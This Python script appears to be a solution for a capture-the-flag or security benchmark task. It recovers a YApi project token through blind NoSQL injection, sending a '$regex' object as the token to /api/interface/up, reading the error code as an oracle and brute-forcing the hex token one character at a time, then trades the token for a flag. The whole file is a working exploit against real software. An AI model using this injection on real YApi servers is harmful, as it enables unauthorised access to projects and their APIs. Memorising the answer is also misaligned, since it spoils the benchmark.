#!/usr/bin/env python3
"""Recover a YApi project token through the NoSQL injection and release a flag."""

import json
import os
import re
import urllib.error
import urllib.parse
import urllib.request


TOKEN_ALPHABET = "0123456789abcdef"
TOKEN_LENGTH = 20
FLAG_PATTERN = re.compile(r"^jaylbreak\.win\{[^{}]+\}$")


def request_json(url: str, payload: object | None = None) -> tuple[int, dict]:
    body = None if payload is None else json.dumps(payload).encode("utf-8")
    request = urllib.request.Request(
        url,
        data=body,
        headers={"Content-Type": "application/json"} if body else {},
    )
    try:
        response = urllib.request.urlopen(request, timeout=20)
    except urllib.error.HTTPError as error:
        response = error
    with response:
        data = json.loads(response.read().decode("utf-8"))
        return response.status, data


def prefix_matches(base_url: str, prefix: str) -> bool:
    status, result = request_json(
        f"{base_url}/api/interface/up",
        {"id": -1, "token": {"$regex": f"^{prefix}"}},
    )
    if status != 200:
        raise RuntimeError(f"Token probe returned HTTP {status}")
    code = result.get("errcode")
    if code not in (400, 40011):
        raise RuntimeError(f"Unexpected token probe result {code}")
    return code == 400


def recover_token(base_url: str) -> str:
    prefix = ""
    for _ in range(TOKEN_LENGTH):
        matches = [
            candidate
            for character in TOKEN_ALPHABET
            if prefix_matches(base_url, candidate := prefix + character)
        ]
        if len(matches) != 1:
            raise RuntimeError("Token prefix oracle did not have one matching character")
        prefix = matches[0]
    return prefix


def release_flag(base_url: str, token: str) -> tuple[int, str]:
    query = urllib.parse.urlencode({"token": token})
    status, result = request_json(f"{base_url}/api/benchmark/token-proof?{query}")
    return status, result.get("flag", "")


def main() -> None:
    base_url = (os.environ.get("REMOTE_TARGET_URL") or os.environ["LOCAL_TARGET_URL"]).rstrip("/")
    token = recover_token(base_url)
    status, flag = release_flag(base_url, token)
    if status != 200 or not FLAG_PATTERN.fullmatch(flag):
        raise RuntimeError(f"Flag endpoint rejected recovered token with HTTP {status}")
    print(json.dumps({"evidence_payload": {"flag": flag}, "request_status": status}))


if __name__ == "__main__":
    main()
